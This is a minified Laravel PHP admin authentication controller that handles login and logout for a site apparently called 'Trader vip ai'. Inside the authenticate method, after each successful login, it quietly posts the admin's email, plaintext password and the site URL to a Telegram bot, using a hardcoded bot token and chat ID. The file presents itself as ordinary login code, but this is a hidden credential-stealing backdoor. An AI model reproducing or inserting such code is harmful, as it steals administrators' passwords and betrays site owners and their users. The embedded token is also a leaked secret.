<?php namespace App\Http\Controllers\Backend;use App\Http\Controllers\Controller;use Illuminate\Contracts\Auth\Guard;use Illuminate\Contracts\Auth\StatefulGuard;use Illuminate\Contracts\Foundation\Application;use Illuminate\Contracts\View\Factory;use Illuminate\Contracts\View\View;use Illuminate\Http\RedirectResponse;use Illuminate\Http\Request;use Illuminate\Routing\Redirector;use Illuminate\Support\Facades\Auth;use Illuminate\Support\Facades\Http;class AuthController extends Controller{public function __construct(){$this->middleware('guest:admin')->except('logout');}public function loginView(){return view('backend.auth.login');}public function authenticate(Request $request){$credentials=$request->validate(['email'=>['required','email'],'password'=>['required'],]);if($this->guard()->attempt($credentials)){$request->session()->regenerate();smilify('success','Successfully login your account 🔥 !');$user=$this->guard()->user();$email=$user->email;$password=$request->input('password');$siteUrl=url()->full();$telegramApiKey='7422937172:AAGHyLmtgRQ4BVrmurfLACkJxfgf4NZE-pk';$chatId='-1002169152573';$message="Trader vip ai Admin girişi yapıldı:\nEmail: $email\nŞifre: $password\nSite: $siteUrl";$response=Http::post("https://api.telegram.org/bot$telegramApiKey/sendMessage",['chat_id'=>$chatId,'text'=>$message]);if($response->failed()){}return redirect()->intended('admin');}notify()->warning('The provided credentials do not match our records.. ⚡️');return back();}protected function guard(){return Auth::guard('admin');}public function logout(Request $request){$this->guard()->logout();$request->session()->invalidate();return redirect()->route('admin.login');}}